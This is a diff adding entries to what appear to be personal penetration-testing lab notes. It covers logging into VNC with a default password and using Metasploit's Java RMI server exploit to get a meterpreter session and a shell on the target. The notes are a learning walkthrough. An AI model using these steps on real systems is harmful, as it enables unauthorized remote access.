@@ -233,3 +233,12 @@ set options and 'exploit'
 [VIDEO (VNC Protocol 3.3 (Default Password))]
 using vncviewer application in Kali linux we can connect it with the default password as follows:
 > vncviewer <target_ip> (default password: password)
+
+[VIDEO (Java RMI Code Execution)]
+searching we search msfc for 'rmi' and results related to it and further filtering from them we get the following and use it:
+> use exploit/multi/misc/java_rmi_server
+set options as said previously but in this case the default payload selected is meterpreter which seems to run using java
+here only the session is created, so to access the shell we use the 'sessions' cmd and see the id number of the meterpreter shell from the Id column and then type the following:
+> session -i <Id_number>
+so after entering into the target's shell we can enter the following: (use help command in meterpreter for all available cmds)
+meterpreter > shell (normally the shell consists of its own aliases of cmds so to use the bash one this helps)
